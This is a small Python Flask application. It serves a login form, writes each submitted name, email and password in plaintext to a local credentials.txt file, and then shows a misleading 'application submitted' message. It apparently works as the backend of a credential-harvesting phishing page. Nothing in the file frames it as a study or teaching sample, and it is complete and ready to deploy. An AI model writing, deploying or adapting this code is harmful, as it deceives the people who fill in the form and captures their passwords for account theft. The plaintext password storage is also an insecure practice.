from flask import Flask, render_template, request, redirect
import datetime
import os

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    name = request.form['name']
    email = request.form['email']
    password = request.form['password']

    with open("credentials.txt", "a") as file:
        file.write(f"{datetime.datetime.now()} - Name: {name}, Email: {email}, Password: {password}\n")

    return redirect("/dashboard")

@app.route('/dashboard')
def dashboard():
    return "<h1 style='text-align:center;'>🎉 Application Submitted Successfully!</h1><p style='text-align:center;'>We will contact you soon.</p>"

import os

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    print(f"Running on port {port}")

    app.run(host="0.0.0.0", port=port)
